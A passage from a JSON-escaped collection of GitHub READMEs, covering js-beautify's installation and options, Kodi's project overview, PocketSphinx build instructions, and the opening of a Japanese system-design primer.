will reformat and re-indent bookmarklets, ugly\nJavaScript, unpack scripts packed by Dean Edward\u2019s popular packer,\nas well as partly deobfuscate scripts processed by the npm package\n[javascript-obfuscator](https:\/\/github.com\/javascript-obfuscator\/javascript-obfuscator).\n\nOpen [beautifier.io](https:\/\/beautifier.io\/) to try it out.  Options are available via the UI.\n\n# Contributors Needed\nI'm putting this front and center above because existing owners have very limited time to work on this project currently.\nThis is a popular project and widely used but it desperately needs contributors who have time to commit to fixing both\ncustomer facing bugs and underlying problems with the internal design and implementation.\n\nIf you are interested, please take a look at the [CONTRIBUTING.md](https:\/\/github.com\/beautify-web\/js-beautify\/blob\/master\/CONTRIBUTING.md) then fix an issue marked with the [\"Good first issue\"](https:\/\/github.com\/beautify-web\/js-beautify\/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) label and submit a PR. Repeat as often as possible.  Thanks!\n\n\n# Installation\n\nYou can install the beautifier for node.js or python.\n\n## Node.js JavaScript\n\nYou may install the NPM package `js-beautify`. When installed globally, it provides an executable `js-beautify` script. As with the Python script, the beautified result is sent to `stdout` unless otherwise configured.\n\n```bash\n$ npm -g install js-beautify\n$ js-beautify foo.js\n```\n\nYou can also use `js-beautify` as a `node` library (install locally, the `npm` default):\n\n```bash\n$ npm install js-beautify\n```\n\n## Node.js JavaScript (vNext)\n\nThe above install the latest stable release. To install beta or RC versions:\n\n```bash\n$ npm install js-beautify@next\n```\n\n## Web Library\nThe beautifier can be added on your page as web library.\n\nJS Beautifier is hosted on two CDN services: [cdnjs](https:\/\/cdnjs.com\/libraries\/js-beautify) and rawgit.\n\nTo pull the latest version from one of these services include one set of the script tags below in your document:\n```html\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify.js\"><\/script>\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify-css.js\"><\/script>\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify-html.js\"><\/script>\n\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify.min.js\"><\/script>\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify-css.min.js\"><\/script>\n<script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/js-beautify\/1.10.2\/beautify-html.min.js\"><\/script>\n\n<script src=\"https:\/\/cdn.rawgit.com\/beautify-web\/js-beautify\/v1.10.2\/js\/lib\/beautify.js\"><\/script>\n<script src=\"https:\/\/cdn.rawgit.com\/beautify-web\/js-beautify\/v1.10.2\/js\/lib\/beautify-css.js\"><\/script>\n<script src=\"https:\/\/cdn.rawgit.com\/beautify-web\/js-beautify\/v1.10.2\/js\/lib\/beautify-html.js\"><\/script>\n```\n\nOlder versions are available by changing the version number.\n\nDisclaimer: These are free services, so there are [no uptime or support guarantees](https:\/\/github.com\/rgrove\/rawgit\/wiki\/Frequently-Asked-Questions#i-need-guaranteed-100-uptime-should-i-use-cdnrawgitcom).\n\n\n## Python\nTo install the Python version of the beautifier:\n\n```bash\n$ pip install jsbeautifier\n```\n\n\n# Usage\nYou can beautify javascript using JS Beautifier in your web browser, or on the command-line using node.js or python.\n\n## Web Browser\nOpen [beautifier.io](https:\/\/beautifier.io\/).  Options are available via the UI.\n\n## Web Library\nThe script tags above expose three functions: `js_beautify`, `css_beautify`, and `html_beautify`.\n\n## Node.js JavaScript\n\nWhen installed globally, the beautifier provides an executable `js-beautify` script. The beautified result is sent to `stdout` unless otherwise configured.\n\n```bash\n$ js-beautify foo.js\n```\n\nTo use `js-beautify` as a `node` library (after install locally), import and call the appropriate beautifier method for javascript (js), css, or html.  All three method signatures are `beautify(code, options)`. `code` is the string of code to be beautified. options is an object with the settings you would like used to beautify the code.\n\nThe configuration option names are the same as the CLI names but with underscores instead of dashes.  For example, `--indent-size 2 --space-in-empty-paren` would be `{ indent_size: 2, space_in_empty_paren: true }`.\n\n```js\nvar beautify = require('js-beautify').js,\n    fs = require('fs');\n\nfs.readFile('foo.js', 'utf8', function (err, data) {\n    if (err) {\n        throw err;\n    }\n    console.log(beautify(data, { indent_size: 2, space_in_empty_paren: true }));\n});\n```\n\n## Python\nAfter installing, to beautify using Python:\n\n```bash\n$ js-beautify file.js\n```\n\nBeautified output goes to `stdout` by default.\n\nTo use `jsbeautifier` as a library is simple:\n\n```python\nimport jsbeautifier\nres = jsbeautifier.beautify('your javascript string')\nres = jsbeautifier.beautify_file('some_file.js')\n```\n\n...or, to specify some options:\n\n```python\nopts = jsbeautifier.default_options()\nopts.indent_size = 2\nopts.space_in_empty_paren = True\nres = jsbeautifier.beautify('some javascript', opts)\n```\n\nThe configuration option names are the same as the CLI names but with underscores instead of dashes.  The example above would be set on the command-line as `--indent-size 2 --space-in-empty-paren`.\n\n\n# Options\n\nThese are the command-line flags for both Python and JS scripts:\n\n```text\nCLI Options:\n  -f, --file       Input file(s) (Pass '-' for stdin)\n  -r, --replace    Write output in-place, replacing input\n  -o, --outfile    Write output to file (default stdout)\n  --config         Path to config file\n  --type           [js|css|html] [\"js\"] Select beautifier type (NOTE: Does *not* filter files, only defines which beautifier type to run)\n  -q, --quiet      Suppress logging to stdout\n  -h, --help       Show this help\n  -v, --version    Show the version\n\nBeautifier Options:\n  -s, --indent-size                 Indentation size [4]\n  -c, --indent-char                 Indentation character [\" \"]\n  -t, --indent-with-tabs            Indent with tabs, overrides -s and -c\n  -e, --eol                         Character(s) to use as line terminators.\n                                    [first newline in file, otherwise \"\\n]\n  -n, --end-with-newline            End output with newline\n  --editorconfig                    Use EditorConfig to set up the options\n  -l, --indent-level                Initial indentation level [0]\n  -p, --preserve-newlines           Preserve line-breaks (--no-preserve-newlines disables)\n  -m, --max-preserve-newlines       Number of line-breaks to be preserved in one chunk [10]\n  -P, --space-in-paren              Add padding spaces within paren, ie. f( a, b )\n  -E, --space-in-empty-paren        Add a single space inside empty paren, ie. f( )\n  -j, --jslint-happy                Enable jslint-stricter mode\n  -a, --space-after-anon-function   Add a space before an anonymous function's parens, ie. function ()\n  --space-after-named-function      Add a space before a named function's parens, i.e. function example ()\n  -b, --brace-style                 [collapse|expand|end-expand|none][,preserve-inline] [collapse,preserve-inline]\n  -u, --unindent-chained-methods    Don't indent chained method calls\n  -B, --break-chained-methods       Break chained method calls across subsequent lines\n  -k, --keep-array-indentation      Preserve array indentation\n  -x, --unescape-strings            Decode printable characters encoded in xNN notation\n  -w, --wrap-line-length            Wrap lines that exceed N characters [0]\n  -X, --e4x                         Pass E4X xml literals through untouched\n  --good-stuff                      Warm the cockles of Crockford's heart\n  -C, --comma-first                 Put commas at the beginning of new line instead of end\n  -O, --operator-position           Set operator position (before-newline|after-newline|preserve-newline) [before-newline]\n  --indent-empty-lines              Keep indentation on empty lines\n  --templating                      List of templating languages (auto,django,erb,handlebars,php) [\"auto\"] auto = none in JavaScript, all in html\n```\n\nWhich correspond to the underscored option keys for both library interfaces\n\n**defaults per CLI options**\n```json\n{\n    \"indent_size\": 4,\n    \"indent_char\": \" \",\n    \"indent_with_tabs\": false,\n    \"editorconfig\": false,\n    \"eol\": \"\\n\",\n    \"end_with_newline\": false,\n    \"indent_level\": 0,\n    \"preserve_newlines\": true,\n    \"max_preserve_newlines\": 10,\n    \"space_in_paren\": false,\n    \"space_in_empty_paren\": false,\n    \"jslint_happy\": false,\n    \"space_after_anon_function\": false,\n    \"space_after_named_function\": false,\n    \"brace_style\": \"collapse\",\n    \"unindent_chained_methods\": false,\n    \"break_chained_methods\": false,\n    \"keep_array_indentation\": false,\n    \"unescape_strings\": false,\n    \"wrap_line_length\": 0,\n    \"e4x\": false,\n    \"comma_first\": false,\n    \"operator_position\": \"before-newline\",\n    \"indent_empty_lines\": false,\n    \"templating\": [\"auto\"]\n}\n```\n\n**defaults not exposed in the cli**\n```json\n{\n  \"eval_code\": false,\n  \"space_before_conditional\": true\n}\n```\n\nNotice not all defaults are exposed via the CLI.  Historically, the Python and\nJS APIs have not been 100% identical. There are still a\nfew other additional cases keeping us from 100% API-compatibility.\n\n\n## Loading settings from environment or .jsbeautifyrc (JavaScript-Only)\n\nIn addition to CLI arguments, you may pass config to the JS executable via:\n\n * any `jsbeautify_`-prefixed environment variables\n * a `JSON`-formatted file indicated by the `--config` parameter\n * a `.jsbeautifyrc` file containing `JSON` data at any level of the filesystem above `$PWD`\n\nConfiguration sources provided earlier in this stack will override later ones.\n\n## Setting inheritance and Language-specific overrides\n\nThe settings are a shallow tree whose values are inherited for all languages, but\ncan be overridden.  This works for settings passed directly to the API in either implementation.\nIn the Javascript implementation, settings loaded from a config file, such as .jsbeautifyrc, can also use inheritance\/overriding.\n\nBelow is an example configuration tree showing all the supported locations\nfor language override nodes.  We'll use `indent_size` to discuss how this configuration would behave, but any number of settings can be inherited or overridden:\n\n```json\n{\n    \"indent_size\": 4,\n    \"html\": {\n        \"end_with_newline\": true,\n        \"js\": {\n            \"indent_size\": 2\n        },\n        \"css\": {\n            \"indent_size\": 2\n        }\n    },\n    \"css\": {\n        \"indent_size\": 1\n    },\n    \"js\": {\n       \"preserve-newlines\": true\n    }\n}\n```\n\nUsing the above example would have the following result:\n\n* HTML files\n  * Inherit `indent_size` of 4 spaces from the top-level setting.\n  * The files would also end with a newline.\n  * JavaScript and CSS inside HTML\n    * Inherit the HTML `end_with_newline` setting.\n    * Override their indentation to 2 spaces.\n* CSS files\n  * Override the top-level setting to an `indent_size` of 1 space.\n* JavaScript files\n  * Inherit `indent_size` of 4 spaces from the top-level setting.\n  * Set `preserve-newlines` to `true`.\n\n## CSS & HTML\n\nIn addition to the `js-beautify` executable, `css-beautify` and `html-beautify`\nare also provided as an easy interface into those scripts. Alternatively,\n`js-beautify --css` or `js-beautify --html` will accomplish the same thing, respectively.\n\n```js\n\/\/ Programmatic access\nvar beautify_js = require('js-beautify'); \/\/ also available under \"js\" export\nvar beautify_css = require('js-beautify').css;\nvar beautify_html = require('js-beautify').html;\n\n\/\/ All methods accept two arguments, the string to be beautified, and an options object.\n```\n\nThe CSS & HTML beautifiers are much simpler in scope, and possess far fewer options.\n\n```text\nCSS Beautifier Options:\n  -s, --indent-size                  Indentation size [4]\n  -c, --indent-char                  Indentation character [\" \"]\n  -t, --indent-with-tabs             Indent with tabs, overrides -s and -c\n  -e, --eol                          Character(s) to use as line terminators. (default newline - \"\\\\n\")\n  -n, --end-with-newline             End output with newline\n  -L, --selector-separator-newline   Add a newline between multiple selectors\n  -N, --newline-between-rules        Add a newline between CSS rules\n  --indent-empty-lines               Keep indentation on empty lines\n\nHTML Beautifier Options:\n  -s, --indent-size                  Indentation size [4]\n  -c, --indent-char                  Indentation character [\" \"]\n  -t, --indent-with-tabs             Indent with tabs, overrides -s and -c\n  -e, --eol                          Character(s) to use as line terminators. (default newline - \"\\\\n\")\n  -n, --end-with-newline             End output with newline\n  -p, --preserve-newlines            Preserve existing line-breaks (--no-preserve-newlines disables)\n  -m, --max-preserve-newlines        Maximum number of line-breaks to be preserved in one chunk [10]\n  -I, --indent-inner-html            Indent <head> and <body> sections. Default is false.\n  -b, --brace-style                  [collapse-preserve-inline|collapse|expand|end-expand|none] [\"collapse\"]\n  -S, --indent-scripts               [keep|separate|normal] [\"normal\"]\n  -w, --wrap-line-length             Maximum characters per line (0 disables) [250]\n  -A, --wrap-attributes              Wrap attributes to new lines [auto|force|force-aligned|force-expand-multiline|aligned-multiple|preserve|preserve-aligned] [\"auto\"]\n  -i, --wrap-attributes-indent-size  Indent wrapped attributes to after N characters [indent-size] (ignored if wrap-attributes is \"aligned\")\n  -d, --inline                       List of tags to be considered inline tags\n  -U, --unformatted                  List of tags (defaults to inline) that should not be reformatted\n  -T, --content_unformatted          List of tags (defaults to pre) whose content should not be reformatted\n  -E, --extra_liners                 List of tags (defaults to [head,body,\/html] that should have an extra newline before them.\n  --editorconfig                     Use EditorConfig to set up the options\n  --indent_scripts                   Sets indent level inside script tags (\"normal\", \"keep\", \"separate\")\n  --unformatted_content_delimiter    Keep text content together between this string [\"\"]\n  --indent-empty-lines               Keep indentation on empty lines\n  --templating                       List of templating languages (auto,none,django,erb,handlebars,php) [\"auto\"] auto = none in JavaScript, all in html\n```\n\n## Directives\n\nDirectives let you control the behavior of the Beautifier from within your source files. Directives are placed in comments inside the file.  Directives are in the format `\/* beautify {name}:{value} *\/` in CSS and JavaScript. In HTML they are formatted as `<!-- beautify {name}:{value} -->`.\n\n### Ignore directive\n\nThe `ignore` directive makes the beautifier completely ignore part of a file, treating it as literal text that is not parsed.\nThe input below will remain unchanged after beautification:\n\n```js\n\/\/ Use ignore when the content is not parsable in the current language, JavaScript in this case.\nvar a =  1;\n\/* beautify ignore:start *\/\n {This is some strange{template language{using open-braces?\n\/* beautify ignore:end *\/\n```\n\n### Preserve directive\n\nNOTE: this directive only works in HTML and JavaScript, not CSS.\n\nThe `preserve` directive makes the Beautifier parse and then keep the existing formatting of a section of code.\n\nThe input below will remain unchanged after beautification:\n\n```js\n\/\/ Use preserve when the content is valid syntax in the current language, JavaScript in this case.\n\/\/ This will parse the code and preserve the existing formatting.\n\/* beautify preserve:start *\/\n{\n    browserName: 'internet explorer',\n    platform:    'Windows 7',\n    version:     '8'\n}\n\/* beautify preserve:end *\/\n```\n\n# License\n\nYou are free to use this in any way you want, in case you find this useful or working for you but you must keep the copyright notice and license. (MIT)\n\n# Credits\n\n* Created by Einar Lielmanis, <einar@beautifier.io>\n* Python version flourished by Stefano Sanfilippo <a.little.coder@gmail.com>\n* Command-line for node.js by Daniel Stockman <daniel.stockman@gmail.com>\n* Maintained and expanded by Liam Newman <bitwiseman@beautifier.io>\n\nThanks also to Jason Diamond, Patrick Hof, Nochum Sossonko, Andreas Schneider, Dave\nVasilevsky, Vital Batmanov, Ron Baldwin, Gabriel Harrison, Chris J. Shull,\nMathias Bynens, Vittorio Gambaletta and others.\n\n(README.md: js-beautify@1.10.2)\n"},{"repo":"\/xbmc\/xbmc","language":"C++","readme_contents":"![Kodi Logo](docs\/resources\/banner.png)\n\n<p align=\"center\">\n  <strong>\n    <a href=\"https:\/\/kodi.tv\/\">website<\/a>\n    \u2022\n    <a href=\"https:\/\/kodi.wiki\/view\/Main_Page\">docs<\/a>\n    \u2022\n    <a href=\"https:\/\/forum.kodi.tv\/\">community<\/a>\n    \u2022\n    <a href=\"https:\/\/kodi.tv\/addons\">add-ons<\/a>\n  <\/strong>\n<\/p>\n\n<p align=\"center\">\n  <a href=\"LICENSE.md\"><img alt=\"License\" src=\"https:\/\/img.shields.io\/badge\/license-GPLv2-blue.svg?style=flat-square\"><\/a>\n  <a href=\"http:\/\/hits.dwyl.io\/xbmc\/xbmc\"><img alt=\"HitCount\" src=\"http:\/\/hits.dwyl.io\/xbmc\/xbmc.svg\"><\/a>\n  <a href=\"https:\/\/docs.kodi.tv\/\"><img alt=\"Documentation\" src=\"https:\/\/img.shields.io\/badge\/code-documented-brightgreen.svg?style=flat-square\"><\/a>\n  <a href=\"https:\/\/github.com\/xbmc\/xbmc\/pulls\"><img alt=\"PRs Welcome\" src=\"https:\/\/img.shields.io\/badge\/PRs-welcome-brightgreen.svg?style=flat-square\"><\/a>\n  <a href=\"#how-to-contribute\"><img alt=\"Contributions Welcome\" src=\"https:\/\/img.shields.io\/badge\/contributions-welcome-brightgreen.svg?style=flat-square\"><\/a>\n  <a href=\"http:\/\/jenkins.kodi.tv\/\"><img alt=\"Build\" src=\"https:\/\/img.shields.io\/badge\/CI-jenkins-brightgreen.svg?style=flat-square\"><\/a>\n  <a href=\"https:\/\/github.com\/xbmc\/xbmc\/commits\/master\"><img alt=\"Commits\" src=\"https:\/\/img.shields.io\/github\/commits-since\/xbmc\/xbmc\/latest.svg?style=flat-square\"><\/a>\n<\/p>\n\n<h1 align=\"center\">\n  Welcome to Kodi Home Theater Software!\n<\/h1>\n\nKodi is an award-winning **free and open source** software media player and entertainment hub for digital media. Available as a native application for **Android, Linux, BSD, macOS, iOS, and Windows operating systems**, Kodi runs on most common processor architectures.\n\nCreated in 2003 by a group of like minded programmers, Kodi is a non-profit project run by the XBMC Foundation and developed by volunteers located around the world. More than 500 software developers have contributed to Kodi to date, and 100-plus translators have worked to expand its reach, making it available in more than 70 languages.\n\nWhile Kodi functions very well as a standard media player application for your computer, it has been designed to be the perfect companion for your HTPC. With its **beautiful interface and powerful skinning engine**, Kodi feels very natural to use from the couch with a remote control and is the ideal solution for your home theater.\n\n## Give your media the love it deserves\nKodi can be used to play almost all popular audio and video formats around. It was designed for network playback, so you can stream your multimedia from anywhere in the house or directly from the internet using practically any protocol available.\n\nPoint Kodi to your media and watch it **scan and automagically create a personalized library** complete with box covers, descriptions, and fanart. There are playlist and slideshow functions, a weather forecast feature and many audio visualizations. Once installed, your computer or HTPC will become a fully functional multimedia jukebox.\n\n<p align=\"center\">\n  <img src=\"docs\/resources\/kodi.gif\" alt=\"Kodi\">\n<\/p>\n\n## Getting Started\nKodi's developers work hard to make it support a large range of devices and operating systems. We provide final as well as development builds. To get started, head over to the **[downloads section](https:\/\/kodi.tv\/download)** and simply select the platform that you want to install it on. A **[quick start guide](https:\/\/kodi.wiki\/view\/quick_start_guide)** to help you get acquainted with Kodi is available in our wiki.\n\n## How to Contribute\nKodi is created by users for users and **we welcome every contribution**. There are no highly paid developers or poorly paid support personnel on the phones ready to take your call. There are only users who have seen a problem and done their best to fix it. This means Kodi will always need the contributions of users like you. How can you get involved?\n\n* **Coding:** Developers can help Kodi by **[fixing a bug](https:\/\/github.com\/xbmc\/xbmc\/issues)**, adding new features, making our technology smaller and faster and making development easier for others. Kodi's codebase consists mainly of C++ with small parts written in a variety of coding languages. Our add-ons mainly consist of python and XML. For more information, please have a look at our **[contributing guide](docs\/CONTRIBUTING.md)**.\n* **Helping users:** Our support process relies on enthusiastic contributors like you to help others get the most out of Kodi. The #1 priority is always answering questions in our **[support forums](https:\/\/forum.kodi.tv\/)**. Everyday new people discover Kodi, and everyday they are virtually guaranteed to have questions.\n* **Localization:** Translate **[Kodi](https:\/\/www.transifex.com\/teamxbmc\/kodi-main\/)**, **[add-ons](https:\/\/www.transifex.com\/teamxbmc\/xbmc-addons\/)** and **[skins](https:\/\/www.transifex.com\/teamxbmc\/xbmc-skins\/)** into your native language.\n* **Add-ons:** **[Add-ons](https:\/\/kodi.tv\/addons)** are what make Kodi the most extensible and customizable entertainment hub available. **[Get started building an add-on](https:\/\/kodi.tv\/create-an-addon)**.\n* **Documentation:** Kodi's **[wiki pages](https:\/\/kodi.wiki\/)** are the hub for information about Kodi and surrounding ecosystem. Help make our documentation better by writing new content or correcting existing material.\n\n**Not enough free time?** No problem! There are other ways to help Kodi.\n\n* **Spread the word:** Share Kodi with the world! Tell your friends and family about how Kodi creates an amazing entertainment experience. Stay up to date on the latest stories about Kodi reading our **[news](https:\/\/kodi.tv\/blog)** section, follow us on **[Twitter](https:\/\/twitter.com\/koditv)** and **[Facebook](https:\/\/www.facebook.com\/XBMC\/)**, or **star Kodi's repo** if you want to follow development.\n* **Donate:** We are always happy to receive a **[donation](https:\/\/kodi.tv\/contribute\/donate)**. Donations are typically used for travel to attend conferences, any necessary paperwork and legal fees, and the yearly XBMC Foundation Developers Conference, where a great deal of coding and planning for the following year occurs. Donations may also be used to purchase necessary hardware and licenses for developers, along with t-shirts, stickers, and other accessories for conferences.\n* **Buy Kodi merchandise:** Purchasing Kodi gear helps just as much as a donation, and you get something in return! Checkout our **[store](https:\/\/kodi.tv\/store)** for Kodi branded gear. We regularly add new products so check back often.\n\n## Building\nKodi uses CMake as its building system but instructions are highly dependent on your operating system and target platform. Fortunately **[we've got you covered](docs\/README.md)**.\n\n## Acknowledgements\nKodi couldn't exist without\n\n* All the **[contributors](https:\/\/github.com\/xbmc\/xbmc\/graphs\/contributors)**. Big or small a change, it does make a difference.\n* All the developers that write the fantastic **software and libraries** that Kodi uses. We stand on the shoulders of giants.\n* Our **[fantastic community](https:\/\/forum.kodi.tv\/)** for the never ending support, inspiration, feedback, and for keeping us on our toes when we screw up!\n* **[Our sponsors](https:\/\/kodi.tv\/sponsors)**. Without them, keeping a huge project like this alive would be next to impossible.\n\n## License\nKodi is **[GPLv2 licensed](LICENSE.md)**. You may use, distribute and copy it under the license terms.\n\n<a href=\"https:\/\/github.com\/xbmc\/xbmc\/graphs\/contributors\"><img src=\"https:\/\/forthebadge.com\/images\/badges\/built-by-developers.svg\" height=\"25\"><\/a>\n<a href=\"https:\/\/github.com\/xbmc\/xbmc\"><img src=\"https:\/\/forthebadge.com\/images\/badges\/certified-cousin-terio.svg\" height=\"25\"><\/a>\n<a href=\"https:\/\/github.com\/xbmc\/xbmc\"><img src=\"https:\/\/forthebadge.com\/images\/badges\/approved-by-george-costanza.svg\" height=\"25\"><\/a>\n<a href=\"https:\/\/kodi.tv\/download\"><img src=\"https:\/\/forthebadge.com\/images\/badges\/check-it-out.svg\" height=\"25\"><\/a>\n<a href=\"https:\/\/github.com\/xbmc\/xbmc\"><img src=\"https:\/\/forthebadge.com\/images\/badges\/winter-is-coming.svg\" height=\"25\"><\/a>\n"},{"repo":"\/cmusphinx\/pocketsphinx","language":"C","readme_contents":"PocketSphinx 5prealpha\n===============================================================================\n\nThis is PocketSphinx, one of Carnegie Mellon University's open source large\nvocabulary, speaker-independent continuous speech recognition engine.\n\n**THIS IS A RESEARCH SYSTEM**. This is also an early release of a research\nsystem. We know the APIs and function names are likely to change, and that\nseveral tools need to be made available to make this all complete. With your\nhelp and contributions, this can progress in response to the needs and patches\nprovided.\n\n**Please see the LICENSE file for terms of use.**\n\nPrerequisites\n-------------------------------------------------------------------------------\n\nYou **must** have SphinxBase, which you can download from\nhttp:\/\/cmusphinx.sourceforge.net. Download and unpack it to the same parent\ndirectory as PocketSphinx, so that the configure script and project files can\nfind it. On Windows, you will need to rename 'sphinxbase-X.Y' (where X.Y is the\nSphinxBase version number) to simply 'sphinxbase' for this to work.\n\nLinux\/Unix installation\n------------------------------------------------------------------------------\n\nIn a unix-like environment (such as linux, solaris etc):\n\n * Build and optionally install SphinxBase. If you want to use\n   fixed-point arithmetic, you **must** configure SphinxBase with the\n   `--enable-fixed` option.\n\n * If you downloaded directly from the CVS repository, you need to do\n   this at least once to generate the \"configure\" file:\n\n   ```\n   $ .\/autogen.sh\n   ```\n * If you downloaded the release version, or ran `autogen.sh` at least\n   once, then compile and install:\n\n   ```\n   $ .\/configure\n   $ make clean all\n   $ make check\n   $ sudo make install\n   ```\n\nXcode Installation (for iPhone)\n------------------------------------------------------------------------------\n\nPocketsphinx uses the standard unix autogen system, you can build pocketsphinx\nwith automake given you already built sphinxbase You just need to pass correct\nconfigure arguments, set compiler path, set sysroot and other options. After\nyou build the code you need to import dylib file into your project and you also\nneed to configure includes for your project to find sphinxbase headers.\n\nYou also will have to create a recorder to capture audio with CoreAudio and\nfeed it into the recognizer.\n\nFor details see http:\/\/github.com\/cmusphinx\/pocketsphinx-ios-demo\n\nIf you want to quickly start with Pocketsphinx, try OpenEars toolkit which\nincludes Pocketsphinx http:\/\/www.politepix.com\/openears\/\n\n\nAndroid installation\n------------------------------------------------------------------------------\n\nSee http:\/\/github.com\/cmusphinx\/pocketsphinx-android-demo.\n\n\nMS Windows\u2122 (MS Visual Studio 2012 (or newer - we test with VC++ 2012 Express)\n------------------------------------------------------------------------------\n\n * load sphinxbase.sln located in sphinxbase directory\n\n * compile all the projects in SphinxBase (from sphinxbase.sln)\n\n * load pocketsphinx.sln in pocketsphinx directory\n\n * compile all the projects in PocketSphinx\n\nMS Visual Studio will build the executables under .\\bin\\Release or\n.\\bin\\Debug (depending on the version you choose on MS Visual Studio),\nand the libraries under .\\lib\\Release or .\\lib\\Build.\n\nTest scripts are forthcoming for Windows.\n\nFor up-to-date information, see http:\/\/cmusphinx.sourceforge.net.\n"},{"repo":"\/donnemartin\/system-design-primer","language":"Python","readme_contents":"*[English](README.md) \u2219 [\u65e5\u672c\u8a9e](README-ja.md) \u2219 [\u7b80\u4f53\u4e2d\u6587](README-zh-Hans.md) \u2219 [\u7e41\u9ad4\u4e2d\u6587](README-zh-TW.md) | [\u0627\u0644\u0639\u064e\u0631\u064e\u0628\u0650\u064a\u064e\u0651\u0629\u200e](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/170) \u2219 [\u09ac\u09be\u0982\u09b2\u09be](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/220) \u2219 [Portugu\u00eas do Brasil](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/40) \u2219 [Deutsch](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/186) \u2219 [\u03b5\u03bb\u03bb\u03b7\u03bd\u03b9\u03ba\u03ac](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/130) \u2219 [\u05e2\u05d1\u05e8\u05d9\u05ea](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/272) \u2219 [Italiano](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/104) \u2219 [\u97d3\u570b\u8a9e](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/102) \u2219 [\u0641\u0627\u0631\u0633\u06cc](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/110) \u2219 [Polski](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/68) \u2219 [\u0440\u0443\u0441\u0441\u043a\u0438\u0439 \u044f\u0437\u044b\u043a](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/87) \u2219 [Espa\u00f1ol](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/136) \u2219 [\u0e20\u0e32\u0e29\u0e32\u0e44\u0e17\u0e22](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/187) \u2219 [T\u00fcrk\u00e7e](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/39) \u2219 [ti\u1ebfng Vi\u1ec7t](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/127) \u2219 [Fran\u00e7ais](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/250) | [Add Translation](https:\/\/github.com\/donnemartin\/system-design-primer\/issues\/28)*\n\n# \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u5165\u9580\n\n<p align=\"center\">\n  <img src=\"http:\/\/i.imgur.com\/jj3A5N8.png\"\/>\n  <br\/>\n<\/p>\n\n## \u52d5\u6a5f\u30fb\u76ee\u7684\n\n> \u5927\u898f\u6a21\u30b7\u30b9\u30c6\u30e0\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u3092\u5b66\u3076\n>\n> \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u306b\u5099\u3048\u308b\n\n### \u5927\u898f\u6a21\u30b7\u30b9\u30c6\u30e0\u306e\u8a2d\u8a08\u3092\u5b66\u3076\n\n\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb\u306a\u30b7\u30b9\u30c6\u30e0\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u3092\u5b66\u3076\u3053\u3068\u306f\u3001\u3088\u308a\u826f\u3044\u30a8\u30f3\u30b8\u30cb\u30a2\u306b\u306a\u308b\u3053\u3068\u306b\u8cc7\u3059\u308b\u3067\u3057\u3087\u3046\u3002\n\n\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306f\u3068\u3066\u3082\u5e83\u7bc4\u306a\u30c8\u30d4\u30c3\u30af\u3092\u542b\u307f\u307e\u3059\u3002\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u539f\u7406\u306b\u3064\u3044\u3066\u306f **\u30a4\u30f3\u30bf\u30fc\u30cd\u30c3\u30c8\u4e0a\u306b\u306f\u81a8\u5927\u306a\u91cf\u306e\u6587\u732e\u304c\u6563\u3089\u3070\u3063\u3066\u3044\u307e\u3059\u3002**\n\n\u3053\u306e\u30ea\u30dd\u30b8\u30c8\u30ea\u306f\u5927\u898f\u6a21\u30b7\u30b9\u30c6\u30e0\u69cb\u7bc9\u306b\u5fc5\u8981\u306a\u77e5\u8b58\u3092\u5b66\u3076\u3053\u3068\u304c\u3067\u304d\u308b **\u6587\u732e\u30ea\u30b9\u30c8\u3092\u4f53\u7cfb\u7684\u306b\u307e\u3068\u3081\u305f\u3082\u306e** \u3067\u3059\u3002\n\n### \u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u30b3\u30df\u30e5\u30cb\u30c6\u30a3\u304b\u3089\u5b66\u3076\n\n\u3053\u306e\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306f\u3001\u3053\u308c\u304b\u3089\u3082\u305a\u3063\u3068\u66f4\u65b0\u3055\u308c\u3066\u3044\u304f\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u521d\u671f\u6bb5\u968e\u306b\u3059\u304e\u307e\u305b\u3093\u3002\n\n[Contributions](#contributing) \u306f\u5927\u6b53\u8fce\u3067\u3059\uff01\n\n### \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u306b\u5099\u3048\u308b\n\n\u30b3\u30fc\u30c9\u6280\u8853\u9762\u63a5\u306b\u52a0\u3048\u3066\u3001\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306b\u95a2\u3059\u308b\u77e5\u8b58\u306f\u3001\u591a\u304f\u306e\u30c6\u30c3\u30af\u4f01\u696d\u306b\u304a\u3051\u308b **\u6280\u8853\u63a1\u7528\u9762\u63a5\u30d7\u30ed\u30bb\u30b9** \u3067 